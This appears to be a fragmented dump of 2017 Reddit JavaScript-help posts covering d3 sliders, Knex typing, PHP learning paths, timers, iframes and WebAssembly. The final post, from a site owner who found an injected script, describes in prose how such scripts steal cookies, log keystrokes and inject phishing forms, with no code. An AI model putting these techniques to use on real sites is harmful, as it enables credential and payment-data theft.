Our goal is to show the volcano based on some filters. One filter is the VEI (volcanic eruption index) and the other is the year the eruption started. Thanks to some two sided sliders, the volcano data can be sorted out depending on the interval you choose with the sliders. Everytime after the sliders are moved, other volcanoes should appear.

Now our problem: we have done quite a lot on the project, but we can't link the sliders to the filters and show the right volcanoes corresponding to the years/VEIs we choose. Our knowledge isn't enough for this part of the project sadly. The professors still want to see our project finished on tuesday afternoon. Without some help from people who know javascript and d3 well, we can't finish it. :(

If someone out here is willing to help us, we would be reeeeeally thankful !! 
Thanks also for reading this :)

tl,dr: we have some big problems connecting our sliders with the filters for the volcano data to show on a map. Without this, our project is screwed ^^'",Need urgent help in javascript/d3 project about volcanoes
569,2017-05-19 23:37:18,2,2,"Hey, I'm a C# developer and my javascript had always been limited to simple browser DOM manipulation 5 years ago, never more than a 100 lines. Now I'm in a new role with a lot of nodeJs using a Typescript. So this application scale programming is new to me.

Now to get to my problem: we use a module called Knex.js for database query building. It doesn't have an upsert function because of SQL DB compatibility issues. However we're pretty stuck on MySQL so I'd like to add it.

We have a .ts file that looks like this:

    import Knex = require('knex')
    let knex: Knex
    if (EnvironmentService.isProduction()) {
        knex = Knex(databaseConfig.production)  
    } else if (EnvironmentService.isDevelopment()) {
        knex = Knex(databaseConfig.development)
    } else if (EnvironmentService.isStaging()) {
        knex = Knex(databaseConfig.staging)
    } else if (EnvironmentService.isRelease()) {
        knex = Knex(databaseConfig.release)
    } else if (EnvironmentService.isIntegrationTest()) {
        knex = Knex(databaseConfig.integrationTest)
    }

    export default knex

Now looking in the Typescript definition of Knex I see this:

    declare function Knex(config: Knex.Config): Knex;

So that's a function that builds a type that implements the Knex interface, it's a factory method of sorts. But what is the type is uses to implement that interface?

What I want to do is make

    interface UpsertableKnex implements Knex

but I can't then implement UpsertableKnex because I don't know what Knex implementation to extend. How can I find that? Looking at the type definition for Knex I can't find out where that factory function is actually defined. So I have no idea how to create a class I can tack my Upsert() function on to.

I'm thinking about this from a C# mindset, am I attacking this the wrong way?",Newbie question: extending a class functionality

571,2017-05-21 13:04:07,34,39,"Hello all,

I am a freelancer with 2 years of experience. My work predominantly has been front end development. I have built static websites, bootstrap based responsive websites and wordpress websites. 

I know some basics of php. I have used them in my websites mainly for forms,  bit of theme tweaking in wordpress, basic CRUD operations for a few personal projects. But I do not know OOP or MVC concepts of PHP. 

I have been trying to move to next level and transition into a full stack developer which has become a default requirement for most of the works I have come across. I hate not being able to take up a work offer because I don't have skill sets in it. 

A common recommendation has been to move to the JS frameworks which I have often found in various programming subreddits,various tech websites, blogs like medium etc. I tried and unfortunately can't wrap my head around javascript for backend. There are too many changes happening too fast which has resulted in a chaos and nobody know that is the proper direction. Sometimes I wonder why lot of complicated things has to be done in JS where a few lines of php is sufficient. 

Why I want to be a full stack developer in PHP ?  - Its stability. PHP gets job done for me. Clients often do not care whats is running under the hood untill website looks shiny and does what it is supposed to do. Frankly I care only about making a living and do not want to get into a nitty gritty issues of why js is bettern than php and what not. 

Also coming from India (a third world country), why php seems to be a safe path is that there are tons of documentation and affordable learning resources. More often than not issues which I run into are often asked and answered by someone on stackoverflow. PHP hosting is cheap as well and most shared hosting have started offering PHP 7 and above. I also have experience of installing LAMP stack on DO droplet. 

To improve my php skills this is the path i thought I should follow. I referred various learning materials on sites such as lynda, teamtreehouse etc and made a list. 

* Basic PHP and MySQL 
* Object Oriented PHP
* New features of PHP7
* API &amp; Microframeworks - Silex, Slim
* PHP Unit Testing &amp; TTD
* Design Patterns in PHP
* PHP database &amp; PDO
* Move to advanced framework like Laravel

I would love to know the feedback of about my learning path. If there are any additional things which I need to learn, please do recommend ! My only objective is to be a pro developer in 2017 and make a decent living. 

Sorry for big wall of text. Thanks in advance !

Thing is, `self` is the window right? These solutions somehow end up equating the window to the object so that it's functionally the same as `this` in this case. How does that happen? The function isn't even globally scoped, which still wouldn't make sense to me but at least would get it a little closer to the window. Thanks!",[Question] Question on a question with self vs. this.

The main code is:

    function startTimer(seconds, container, oncomplete) {
    var startTime, timer, obj, ms = seconds*1000,
        display = document.getElementById(container);
    obj = {};
    obj.resume = function() {
        startTime = new Date().getTime();
        timer = setInterval(obj.step,250); // adjust this number to affect granularity
                            // lower numbers are more accurate, but more CPU-expensive
    };
    obj.pause = function() {
        ms = obj.step();
        clearInterval(timer);
    };
    obj.step = function() {
        var now = Math.max(0,ms-(new Date().getTime()-startTime)),
            m = Math.floor(now/60000), s = Math.floor(now/1000)%60;
        s = (s &lt; 10 ? ""0"" : """")+s;
        display.innerHTML = m+"":""+s;
        if( now == 0) {
            clearInterval(timer);
            obj.resume = function() {};
            if( oncomplete) oncomplete();
        }
        return now;
    };
    obj.resume();
    return obj;
}

Then you start, pause, and resume with this:

    // start:
var timer = startTimer(5*60, ""timer"", function() {alert(""Done!"");});
// pause:
timer.pause();
// resume:
timer.resume();

I want to have the amount of time set in an input field, and then have start, pause, and resume triggered by HTML buttons. 

I've tried straight up triggering the function from onclick like this:
    &lt;button onclick=""startTimer(1 * 60, ""timer"", function() {
    alert(""Done!"");""&gt;

but [that didn't do anything](https://jsfiddle.net/j8318xLo/).

I've also tried triggering timer.pause() from a button's onclick attribute. That didn't work either.

Could anyone point me in the right direction? ",Calling functions within functions through HTML button onclick

I've been working on a javascript game for quite a while now...

Now everything works so far...

I have tile maps made out of 16x16 tiles.

When the player pressed ENTER it calls ""game.input.interact()"" method and then it goes like this:

    game.input.interact = function (map) {

        checkx = player.x / 16
        checky = player.y / 16

        if (player.anim == ""upidle"") checky = player.y / 16 - 1
        if (player.anim == ""downidle"") checky = player.y / 16 + 1
        if (player.anim == ""leftidle"") checky = player.x / 16 - 1
        if (player.anim == ""rightidle"") checky = player.x / 16 + 1

        for(var i = 0;i &lt; 4;i ++) {
            if (i == 0) tile.checked = map[Math.floor(checky)][Math.ceil(checkx)]
            if (i == 1) tile.checked = map[Math.ceil(checky)][Math.floor(checkx)]
            if (i == 2) tile.checked = map[Math.floor(checky)][Math.floor(checkx)]
            if (i == 3) tile.checked = map[Math.ceil(checky)][Math.ceil(checkx)]

            if (tile.checked == 1001) alert(""lol"")
        }

As a product owner, I would like to show the user a selectable list of neighborhoods where activities are available with KidPass.

Description:
Within the attached json file (this is an actual response from our API), there is an array of objects. Each object has two properties, a borough, and mappings. Mappings also has two properties, macro and neighborhoods. Macro is kind of like a larger neighborhood. For example, Manhattan doesn’t have an actual neighborhood called “Above 125th”. Instead, “Above 125th” is a macro neighborhood that consists of the actual Manhattan neighborhoods: Harlem, Inwood, Washington Heights. You’ll also notice that some Macro neighborhoods are the same as the borough.

Acceptance Criteria:
In area A of the html page, display a list of boroughs along with their neighborhoods in a way that shows the hierarchy.
Fit macro neighborhoods into that hierarchy, but only list a macro neighborhood within the borough’s listing if it’s not the same as the borough. So some listings will be three levels deep: Borough -&gt; Macro -&gt; Neighborhood
The boroughs and macro neighborhoods should be ordered ascending by weight.
On the same page, in a separate area (we’ll call it area B), show a listing of just the boroughs. 
Only the neighborhoods in area A are clickable. When I click on a neighborhood in area A, the borough which that neighborhood belongs to should be highlighted (will leave that up to you as to how the highlighting should work).
Use javascript. Feel free to use a utility library like lodash.

Extra Credit
Don’t use jquery.
Make it look nice.

604,2017-05-31 20:59:31,12,5,"Let's say you have two components:

	mycomponent1
		|__myfavlib.js
		|__component.js
		|__index.html

	mycomponent2
		|__myfavlib.js
		|__component.js
		|__index.html

Components can (and should) be very simple and logical, but they pose some nice challenges for a web developer due to the nature of JavaScript.

If we add both of these components to a web page, there will be a conflict for myfavlib.js. There might also be a conflict for component.js if both files contain the same name for an object or function.

So I started experimenting with iframes since they provide isolation. I found out that you can load a component in an iframe and then move the component object (dom elements) out of the iframe into the main (parent) page using JavaScript. This leaves behind the component's scripts in the iframe, where they remain functional for the component but isolated so they don't conflict with other scripts.

Since the component's scripts are in the iframe, the component can live its life outside the iframe (on the parent page) and get affected by the parent page's JS/CSS while being able to dynamically load resources and modules it needs at any time, keeping these files isolated and only available to the component.

So you have a complex DOM widget on the parent page and an isolated JavaScript execution context for it in an iframe somewhere. Isn't this kind of what native web components aims to achieve? What limitations should I expect when using iframes like this?

When a component is loaded, it creates an instance of itself as a JavaScript object, so we can send the object reference from the iframe to the parent page, where we can basically ignore the existence of the iframe and make calls on the component like so:

	mycomponent1.dostuff()

	mycomponent1.load(""bestlib.js"")

Since the mycomponent1's code is still isolated in an iframe, we can load bestlib.js without worrying about any of the code inside bestlib.js conflicting with the rest of the components on the parent page. The bestlib.js is loaded in isolation just for that component.

I'm not sure if there's a benefit to pulling the components out of the iframes or just leaving them there and encapsulating all my components inside iframes, but this may open up some new possibilities for web components.

Has anyone heard of this trick or know if it is being used anywhere?

The position should last four to eight weeks and will begin about ten days from now, so I have time to put my head down and really dig into anything I don't know. I can dedicate up to 12 hours a day to hopefully patch any holes in my knowledge.

In summary, I'll basically be rewriting the client's integrations with third-party APIs in Node and helping to establish good patterns for their team to use in the future.

Here are some of the position's requirements:

* Experience writing unit and integration tests in Node.js
* Experience securing Node.js/Express APIs
* Experience configuring, monitoring, and logging Node.js applications

I have experience writing unit tests but not a ton of experience writing integration tests. I need to get up to speed on testing best practices, specifically for Node, ASAP.

I have no clue as to how to secure a Node.js/Express API.

I'm not sure how I'd go about monitoring and logging the client's Node.js application, but I was thinking I might use New Relic. Is this a good choice?

There are additionally some nice-to-haves, but I won't go into them for now.

example:

it works fine - the data comes from an ajax call, all good.  I can populate the page and the initial values of my forms exactly as I expect to.

yet, later once the user edits the value of the textbox, I'm unable to see the new value with code like:

var name = $(""#customerName"").val();

what I get is ""{{name}}"" instead of the real new value that I can see on-screen in the textbox.

besides the very contrived example here, what am I doing wrong?

thanks!

**solved**

as it turns out, it had nothing to do with Mustache, other than my being an idiot first time user of it :)  I loaded a template and used it...  by putting the output ""elsewhere"" on the document.  figuring to leave the template re-usable for later.  well, the template included the ID on the elements of course, and so I had duplicated IDs.  

one in the hidden div holding the template and one in the output div holding the mustache-merged visible content.

so two copies of the textbox on the same page, with the same ID.  using jQuery selectors by ID then found the first one, without complaining, and without anything telling me that I had two elements with the same ID.  the first one still had value {{Name}} while the second one had the actual value.

the solution is of course ""don't do that!""  - don't have duplicate IDs.  I know that but somehow overlooked that I was producing this problem.  it's crazy how long you can look at something and not see it.  it has been a while since I've had to actually debug javascript and the modern tools seem less helpful than the old Firebug was.  but maybe that's just me being an old timer.

642,2017-06-12 00:45:16,2,2,"Hey guys. Looking for some suggestions on how to implement testing/debugging in my project that is a bit unusual. I'm a hobbyist so I probably won't use correct terms.  

I'm writing a library for a c++ desktop app that executes js with mozilla spidermonkey and I'm trying to write my code so its testable and debuggable. I dont have the luxury of being able to use a web testing framework like mocha (I dont think?) so I am looking for a way to test myself. The core app uses a very outdated version of spidermonkey so a lot of newer js features/syntax aren't usable.  

Is it bad to have statements like `if (debug) {...}` littered through code that is in this case essentially ""production""?  

This is how it is currently and I'm finding its making even the shortest of functions long and harder to follow. I'm thinking that I will write 2 of each script, one which includes testing code and just excute that one when I need to test leaving my ""main"" script clean of verbose debugging code.  

Although the above doesn't seem effecient after writing this out, because if I update a script I will have to update both test and main versions.  

So I should write tests for each function (unit testing?) and test on a per function basis instead of a whole script?  

I'm not sure if I actually just answered my own question but that does really seem like the best route. I will still post this so I can hopefully get some advice from you guys that know their stuff and how it might be done in a professional environment.  

Edit:  
I have looked into the mozilla javascript testing linked below really quick. Will read more but, I don't have access to the core app source so I dont think I'm able to use spidermonkey testing. I think I will have to implement it in the library.  

Thanks in advance.",Implementing testing and debugging in my situation

646,2017-06-13 10:36:15,12,2,"Hello.

I've been learning JavaScript for quite a while now and doing it for fun but recently I've decided I'd really like a career change and would start applying for jobs soon. I haven't got much I can show in terms of code/real world javascript (see why in next paragraph) at the moment. That's one of things I'm working on. In the meantime some feedback on my style and anything else would be appreciated. I notice I use a lot of return statements everywhere for example.

 95% of all javascript I've written has been scripts for a desktop application that uses mozilla spidermonkey to execute the javascript. The spidermonkey engine is outdated so I can't use some of the newer features and syntax, template strings/class keyword for example. That's not to say I don't know how to use these features/syntax, I just can't use it in this code. So there might be a weird mix of some newer features and older features.

In this particular code I'm using a function factory design pattern as I need to be able to override certain functions at times, also as a namespace. I have other scripts that use different design patterns.

You're probably not going to be able to understand what the code is actually doing so I guess I'm just looking for feedback on my coding style and anything else you can give me feedback on. If I'm doing something weird, show me how it's actually done! If you were hiring for your company and saw my code what would you think?

This is part of a WIP script from a complete js library I'm writing for the application. I am starting to applying for jobs now, is it worth showing this kind of code to potential employers until I write some more real world js?

I am looking for someone to code with and learn javascript together. Currently, I am able to do the DOM manipulation and want to move to more advance part in javascript and frameworks(such as React , Angular or VUE js ). 

Please message me at herba1090@gmail.com ",Looking for someone learn Javascript together.
652,2017-06-14 09:19:09,20,4,"So the last time I did web development, I used javascript and heavily relied on jQuery and I wrote a massive amount of spaghetti code in notepad++ that got progressively messier as my projects grew to the point where doing anything felt like it was going to take a lot of work/focus.


I could mentally handle looking at a file with a few hundred lines of code, but as that grew to thousands - my head was no longer categorizing things or remembering what I had previously written. It wouldn't be uncommon for me to write the same function twice and not realize it until I audited my own code. This would severely impact my productivity and ability to finish larger projects.


Now I want to start looking at development from a fresh perspective and find some tools to help me not get overwhelmed and keep my code organized.


For starters - What do people use for an IDE these days in web development? I love notepad++ but I always wished it had some kind of a DOM-tree link structure that I could hop between elements from on the side of the screen without sifting up and down a massive file full of divs or functions - maybe there is such a thing now for notepad++? 


Secondly, I am looking at responsive frameworks - I always struggled with getting bogged down by trying to figure out how an element looked in different resolutions/browsers. 
I see that bootstrap is quite popular now and I've done some playing around with it - Is this kind of a staple now for development, using the grid system? 


Third, I am looking at different devices and wondering if there is any one-size fits all solutions to handling different touch events - is jQuery mobile (or jQuery for that matter) relevant?


Fourth, handling data was always just a necessary evil for me. I'd normally do an AJAX call in jQuery on page load using PHP to access data from a database- pull everything I needed and then dump it into arrays of objects/DOM elements and then access it locally from that point forward. I see that Node.js is a thing now - but for simply accessing information from a database - is it worth the learning curve?


Fifth, I'm seeing all of these different frameworks - react/vue/angular/etc - right now these concepts are over my head. I write a function in a javascript file, and I bind that function to an element on a web page and then it is triggered when that bound action takes place. What exactly are these frameworks doing for me that improves how I would normally do this? My skeptical brain is just telling me that this is over-complicating/over-engineering something. I am open minded though - so which of these would be the easiest for me to learn/use as a dumb guy that doesn't understand more abstract development methodologies. 


Sixth, I see this npm - and if I understand this is like a giant repository of code. In order to access it, I need to install node.js on my server. So I have a server right now using NGINX installed on ubuntu. If I install node.js on this server, is that basically just putting a javascript file on my server or is it an actual program? And then by doing that, I can install npm? Which I'm guessing is just another javascript file that has functions that connect to another server somewhere and requests whatever I ask of it - and if it's in the repository, it then installs that javascript file on my server? So if I install node.js - which then allows me to run javascript from my server - it can then install npm (which is javascript) and then I can install jquery from npm.. So then let's say I had a webpage and in my head tag, am I including jquery from whatever folder on my own server npm installed it to? 


So not to sound like a dick, but what's the point of going through all of that hassle when I can just fling a copy of jQuery into my web app folder and include it in my head tag of my project's html or php file? 


How does npm differ from bower? I need to install 2 programs (node.js and npm) - so that I can then install bower, which then I can have bower take jQuery - and manage this somehow? Excuse my french but what in the fuck is the point of having 3 extra layers of dependencies/complexity here? I am open minded - but as I continue trying to understand this I am perplexed by this. So then how does that all work in the reality of me having a notepad++ index.html file open with a &lt;script src='../jQuery1.53432.min.js'&gt; tag in the head of it? What is now happening instead of me doing that? 


Finally - I see git is a popular tool for source control. So instead of me just dumping files back and forth between my web server/test environment in an ftp program (what I would normally do) - I would install git - which I would then be able to access from my server terminal and then type out the physical location and filename of the files i'm working on - on my local machine - and then I would put them in a staging area - and then I would commit those to the project - and it will basically work as a catalog of file changes  - and I can link that to git hub so that I have access to those files?


I am sorry that this post is all over the place - feel free to answer/clarify any and all questions - I will greatly appreciate it.

Why? Because transpiled languages offer their own unique styles of coding (which might have very different syntax than JavaScript).

The most important part is URL-DATA mapping:

    g(C, f(C, URL)) = URL

How can i do this in javascript?
",i'm new to JS so i need your help to clear my doubt
666,2017-06-17 08:40:57,3,7,"hello reddit,

So after a few weeks of learning vanilla JS syntax I'm trying to decode some things that I've seen here and there, most recently the effect that seems to add frames (to reveal a stop motion kinda effect) on the page scroll event. i think these are largely done with SVG, but that's a bit beyond me at this point. 

I'm hoping someone can give me the cleaner code that would provide the same outcome for this (the code works as desired but I'm not convinced it's the most concise way to achieve it).

Thanks in advance for anything!

Seems AirBnB has the same retailer problem with their rental results.

677,2017-06-21 13:13:33,1,2,"CrxOop is originally a library for bringing (classical) object oriented programming to Javascript. **V1.4 of the library introduces a similar implementation for prototype based programming, or what CrxOop calls prototype object based programming (POBP).**


POBP should appeal to those who prefer prototype based programming for their algorithms. Where schema of objects in OOP are usually called classes, CrxOop calls schema of objects in POBP structures.


Supported Features (POBP):


* **Shared Public Scope (Variable):** When a variable member has this scope, it is equivalent to setting the variable on 'this' in the constructor function when coding using plain javascript. Hence, the word 'shared' in the scope name. The variable is visible to all inheriting structures, and only one copy of it exists per instance. Shared public variables are supported on roughly IE9 era browsers and later.

* **Shared Public Scope (Function):** When a function member has this scope, it is equivalent to setting the function on the prototype of the constructor function when coding using plain javascript. One, hence the word 'shared'. Two, there exists only one data entry for each function global to all objects of a particular prototype based data type. This would be contrary to setting the function on 'this' in the constructor function when coding using plain javascript.

* **Shared Private Scope (Variables and Functions):** When a variable member, or a function member, has this scope the member can only be accessed on 'this'. If a structure 'A' defines the member 'x' with this scope, then only functions of 'A' can see 'x'. 'x' is private to 'A'. However, note the word 'shared'. If Structure 'B' inherits structure 'A', then functions of 'B' also have access to 'x'. But not only that, but also if 'A' itself inherits 'C', then functions of 'C' can also see 'x'. In other words, exactly like the shared public scope case, but only members of the structure chain of the instance may see 'x'. It should be noted, that this privacy is across instances, like in OOP. Refer to the structure keyword 'O' in the documentation. Shared private variables are supported on roughly IE9 era browsers and later.

* **Private Scope (Variables and Functions):** When a variable member, or a function member, has this scope the member can only be accessed on functions of the same structure. This is usually enforced in plain javascript by declaring each such members as 'var' in the constructor function taking advantage of closures. However, unlike the plain javascript case, this privacy is across structure instances. Refer to the structure keyword 'O' in the documentation.

* **Public Constructors:** The public scope is supported for constructors only. The scope, and constructors act as expected when coding using plain javascript, but with the added benefit of the guaranteed default constructor invocation like in the OOP case.

* **Multiple Inheritance.**

* **Data Typing.** See also Structrure Typing in the documentation.

* **Iteration** using the native javascript built ""for in"" loop mechanism. CrxOop provides HASOWN(), an equivalent to the built in hasOwnProperty().


**Note that CrxOop is just a js file that can be included in your code, and you are ready to go.**

For full details, and if you are also interested in OOP, refer to the project page and documentation at: 
[Project Page](http://www.creatrix.ca/crxoop)

 
Hit 't' for the documentation menu, or simply click the link on the top right.

 
The project can also be found on github.

707,2017-06-30 01:35:19,8,0,"I'm beating my head against the wall here trying to convert a navigation menu to work with modern browsers (that is, non ActiveX). I'm not good at Javascript (obviously!), and even worse at something like JQuery or AJAX. I know those are the way to go, but I can't even get the little I know about vanilla JS to work, so I don't know that I'll fare any better trying to work in other flavors.

Just as an example, I have this DIV tag to build a top-level menu item (it's shitty design to build the menu items with these tags - duplicates, repeating id, etc - I know, but re-writing the code that builds the menu XML is even worse than the JS):
    
    &lt;div onmouseenter=""DisplayMenuID(this.id);"" onmouseleave=""DisplayMenuID('');"" onclick=""window.event.cancelBubble = true; clickOnEntity(this);"" onselectstart=""return false"" ondragstart=""return false"" id=""207"" image=""images\closedfolder.gif"" imageopen=""images\openfolder.gif"" open=""false"" class=""IcnDsp"" style=""""&gt;
    &lt;table border=""0"" cellspacing=""0"" cellpadding=""2"" id=""207""&gt;
    	&lt;tbody&gt;
    		&lt;tr&gt;
    			&lt;td valign=""middle""&gt;
    				&lt;img border=""0"" id=""image""&gt;
    			&lt;/td&gt;
    			&lt;td valign=""middle"" nowrap="""" onmouseover=""this.style.fontWeight = 'bold';"" onmouseout=""this.style.fontWeight = 'normal';"" class=""DspTxt""&gt;
    				Menu Text
    			&lt;/td&gt;
    		&lt;/tr&gt;
    	&lt;/tbody&gt;
    &lt;/table&gt;
    &lt;/div&gt;

In IE JS, the menu builds with a function for each item that updates the item icon like so:

    var oImage = entity.childNodes[0].all(""image"");
    oImage.src = entity.image;

But I have no way to do even something that basic in non-IE Javascript, because I can't use the MS-specific "".all"" extension to the DOM. I CAN use getElementsByTagName() but that doesn't get the object at the same level (not sure I'm explaining that correctly), nor can I use the "".src = "" assignment since the non-MS DOM doesn't have the same structure.

That's not even counting the headaches just importing the XML to work with in the first place!

First of all, I write php code since 2015. I have written many projects and I have used technologies like xml, json, ajax, javascript etc. I have never used frameworks like laravel before and the truth is that I don't want it so much.

I have read some articles about react, angular or node.js and I have understood that the programmers today they don't write code but they use tools to build apps. Ok, it's fast and some times more secure to use but I don't think that is a good practice. Maybe in a next update or release of a framework things change and you must make big changes in your app, or the framework team stops to update it and this cause security issues in the future.

My friends and I we build web apps from scratch in PHP, we have many projects and we update them with new features or bug fixes so I think that in the future if a framework stops to update with new releases and then if we use this framework then we will have a huge problem because will be must rewrite the app.

739,2017-07-09 17:37:07,2,3,"Hey folks, I'm running from behind a bit here ;).  I am not a web programmer, I was a server admin at a dot-com back in the 90s/early 2000s, well before any of these javascript frameworks were a thing, so I'm struggling to find an authoritative answer to this issue and catch up to the modern world.

I'm assisting (read: doing it all) a local business migrate from a static website to jekyll so that they can more easily manage their content.  They have chosen to use a responsive site template that we have modified to their purposes.  We're pretty close to wrapping it all up, but for one sticky issue...

Like so many templates these days this design they've chosen loads all elements on the index page and then selectively shows/hides them to mimic page loads for the user, with spiffy animations of course.

The catch we have is the need to do this on the 'blog' type section of the site that will hold regularly posted things.

I have done this by having the page that generates their list of posts dynamically change the div container to hold either the list of recent posts, or the post that the user has clicked on, like so...

https://vimeo.com/224845225

But as you can see the most obvious issue is... how to handle caching of that content? As it stands on a local test server, the last content forced into the div is cached, and the original content, the list, is only displayed again after a refresh. I find a lot of posts on stack overflow about cache control with ajax/jquery elements but most are many years old.  What's the best way to handle this?

I suppose the list of posts could be in a variable that is put back if the user does anything but scroll.  Adding an ajax ""cache: false"" control to the beginning of the script doesn't work, because the div must be cached for the index page to load (results in infinite refresh loop on the index page if I cache: false the url).

Code that generates this page below...

    &lt;div id=""posts""&gt;
    {% for post in site.posts %}
    &lt;a class=""postlink"" href=""{{ post.url }}""&gt;{{ post.title }}&lt;/a&gt; 
    - {{ post.date | date: ""%d %B %Y"" }}&lt;br /&gt;
    {% endfor %}
    &lt;/div&gt;

     $("".postlink"").on(""click"",function(event) {
     $(this).parent(""div"").load($(this).attr('href') + ' #postcontent');

742,2017-07-10 10:40:50,2,0,"I have been working on an open-source project that encourages extensions to expand how it works. My background is in C++/Qt desktop and mobile development, but I've worked in various ecosystems/frameworks and content-management frameworks. The advice I'd like to ask for is more generic in nature (not about the product), but the application is a configuration management app (like Plesk or cPanel) written in Node.js. There are several compelling reasons for the language choice. The reason I'm asking here is because the target developers I'd like to attract are similar in profile to a subset of what I've seen around WP/Joomla/Drupal, and this target audience usually works in both PHP and javascript. It is someone who I think of as a ""web integration specialist"" or something similar (I'd love suggestions for a better name). What I *think* is true of this target audience is:

- programming is only a part of their job;

- they are generally self-taught and probably not familiar with a lot of general CS concepts beyond basic language statements, general OO concepts like extending classes, and the general idea of MVC structure;

- they are probably developing on a Windows client and using sFTP for file transfer;

- they are probably uncomfortable using the command line, and might avoid a product that requires them to do so;

- other characteristics to build a good target profile?

I understand I need to provide good documentation and tutorials (probably written and video?) to attract this developer segment. My question is, what else makes life easier and a project more attractive to this segment? Some things I'm considering:

- The target segment seems to like JQuery, and I think it's because the complexity is hidden behind an easy Fluent API. You can develop by just chaining things together. My back-end and front-end probably needs to be similar.

- When I look at why some developers prefer Wordpress, and also the reasons I've read some people give for following the Drupal 7 fork instead of moving onto Drupal 8 (too ""enterprise-y""), it seems like this audience has a lot of resistance to using dependency injection. Should I design an API and my documentation to hide the DI I'm using?

- I don't see the work from this segment (in terms of open-sourced extensions to Joomla, WP, etc.) including any unit testing, and the documentation for those projects downplaying the importance of testing (i.e. you can list extensions in their market places with any coding style, no test, whatever). My project will have more of a Drupal-like idea with contributed modules; can I enforce more restrictions on code quality and not drive potential developers away?

- Project organization (directory structure) seems important. It also seems like this target segment prefers a hook-oriented API, rather than other possibilities (I think this is one reason Joomla languishes a bit; it is structured to break an extension out into an MVC pattern instead of just a free-form piece of code responding to a hook). My API has event-driven hooks; does calling extensions that tie in to this subsystem ""plugins"" (and the directory name as /plugins) seem reasonable?

Here's where WPF enters the picture, again.  Supposedly Granular can enable you to transpile .Net, WPF apps to javascript.   And then there's WebAssembly but I have no idea how far along progress is in that area for anything .Net related.  

Immediately, I'm thinking why aren't more people doing this?  WPF uses the original MVVM architecture.  It's mature.  .Net devs should be loving this.   Granted, WPF has a reputation for being dead.

I am more familiar with general programming than most people, and can navigate programming concepts (classes/inheritance, functions, loops, etc) that are common across languages. I'm self taught in these things and recently was exasperating over ""I don't know how well I know what i know, nor do I know what I don't know, and I don't want to drop a ton of money on education only to find out that I knew it.""

Thanks to the recent [What 10 Things](https://www.reddit.com/r/javascript/comments/6mlc9d/what_10_things_should_a_serious_javascript/) thread, and the excellent top comment, I now have a concrete list of what I don't know... I half-checked about 2 boxes from that list. Excellent, I know where I can go now.

Of course this isn't the whole story. While I'm kinda cynical (I'm just about the guy that people mean when they say ""old people just give no fucks""), I owned and ran a couple of high-traffic websites for a while (millions of daily users) in the past, and supervisory experience.

But I'm old... So my questions are:

1. What do you think my chances are to be accepted to a ""worth a shit"" bootcamp? I know there's millions of them out there, and I could find plenty that would take my money, but the ones worth a shit have an approval process, so those are the ones I'm talking about.

1. Once completed, what do you think my chances are to be taken on somewhere as a old-man junior developer?

After writing command-line version, I was thinking of a way of utilizing it as a python library. After little bit tweaking, I was able to use it as a library for getting contents of multiple dynamic web pages and was able to perform some operations on them in a complete asynchronous manner. It can also execute javascript code on pages by passing it as some field arguments and can display javascript console messages on terminal. Therefore, I was able to do some limited testing in asynchronous manner on web pages. I don't think it's versatile like selenium in functionality, but it can be used in a limited manner for asynchronous scraping/testing depending on the need. Pythonists can take a look at the [sample code] (https://github.com/kanishka-linux/hlspy/blob/master/sample/sample_async.py) available in the repository, which can be executed directly, once hlspy is installed.

Every surgical procedure requires an ""operative report"" which must contain some required information such as patient name, date of procedure, diagnoses, procedure list, indication, and detailed description of the procedure (among other requirements).

About 80-90% of this information is highly repetitive.  Traditionally, the surgeon dictates this information into a phone system at the hospital or surgery center and a transcriptionist types it into the correct format, which is obviously pretty inefficient.  There are a few EMR's that have the capability to make forms and templates, but each surgery center / hospital has its own, different EMR system.

My goal is to have a script or web app that allows me to do minimal typing (patient name, few varying details) but mostly just check boxes or buttons to fill in the standard details but have it still appear like dictated text.  The output can be just raw text with little to no formatting so the individual surgery centers can put the text into their own standard templates.

I have seen apps like this described as ""document automation"" and is mainly used in the legal profession for filling out repetitive legal documents, but there is surprisingly few applications for surgery. 

What is the best way to go about this?  The concept seems way easier than most of the other projects I see on here, but I want to get some recommendations before I head too far down the wrong road.

Except on Wordpress the content of the post is stored in a database, which makes adding graphs to certain pages/posts kind of a pain, unless you modify the functions.php of your theme and have it call the javascript from there. I haven't been able to get that to work either, so I'm wondering - should I just be doing something simpler and use a static site generator like Pelican? Or should I start building something with Django?  

My aim right now is just to make the graphs visible on the web, making the page aesthetically pleasing can come later. How would you approach this, and how much coding overhead can I expect with that approach? Thank you.",How should I display Bokeh graphs on the web?
798,2017-07-22 15:48:09,1,5,"Hey everyone.

I just wanna start with that I'm fairly new at javascript so please dont kill me if it's a silly question.

So I'm building a small application that fetches data from Spotifys web api which uses Oauth2. I've managed to add functionality so when the user presses a login button it opens up the authentication URL.

My problem is that I'm not sure how to tell when the user is done with the authentication process. Because as soon as the user returns to my application I want to parse query string for the access token and log the user in.

My temporary solution is to add the button that parses the query string and retrives the access_token, but this is really silly.

Any tips or ideas would be greatly appreciated.

The project basically involves a lot of writing to excel, which I had downpat in java, but which seems to be a little bit more of an issue in javascript due to the sandboxing issue. My option would be to either push forward with the writing to excel in JavaScript, or to try to in some way call my original java code.

Note that none of the files I need to write to reside on any servers, they are all local.

Which way should I go here? And how would I call my java code with something like Ajax, given that my files and code are all local.

For example, given the following ""module"" compiled to WebAssembly: 

    extern void set_callback(void (*callback)(void *arg), void *arg);
    
    static void callback(void *arg)
    {
      /* ... */
    }
    
    int main() {
      set_callback(&amp;callback, 0);
      return 0;

Can an implementation of `do_callback` in JavaScript invoke the callback without having to rely on an intermediary C function export to do the actual function call?


    var instance = new WebAssembly.Instance(module, {
      memory: /* ... */
      env: {
        set_callback: function set_callback(callbackptr, argptr) {
          // We only got the pointer, is there any  
        },
      },
    }); 

By intermediary function export, I mean that I could add an internal function with public visibility.

    do_callback(void (*callback)(void *arg), void *arg)
    {
      callback();
    } 

Then the JavaScript `set_callback` function can call the function pointer via the delegate `do_callback` function.

    function set_callback(callbackptr, argptr) {
      instance.exports.do_callback(callbackptr, argptr);
    }

But, it's preferable to do this without having to go through that indirection, is it possible? Function tables seem to be made for this exact purpose but importing them has no observable effect.

833,2017-08-03 08:53:24,10,3,"OK, so yesterday I found some malicious code loaded into the header of one of my clients sites (through Magento).  This was calling a javascript file from an external and very dodgy-looking URL.

Researching the possible uses for this, I've mainly come up with these three:

* Cookie theft - The attacker can access the victim's cookies associated with the website using document.cookie, send them to his own server, and use them to extract sensitive information like session IDs.

* Keylogging - The attacker can register a keyboard event listener using addEventListener and then send all of the user's keystrokes to his own server, potentially recording sensitive information such as passwords and credit card numbers.

* Phishing - The attacker can insert a fake login form into the page using DOM manipulation, set the form's action attribute to target his own server, and then trick the user into submitting sensitive information.

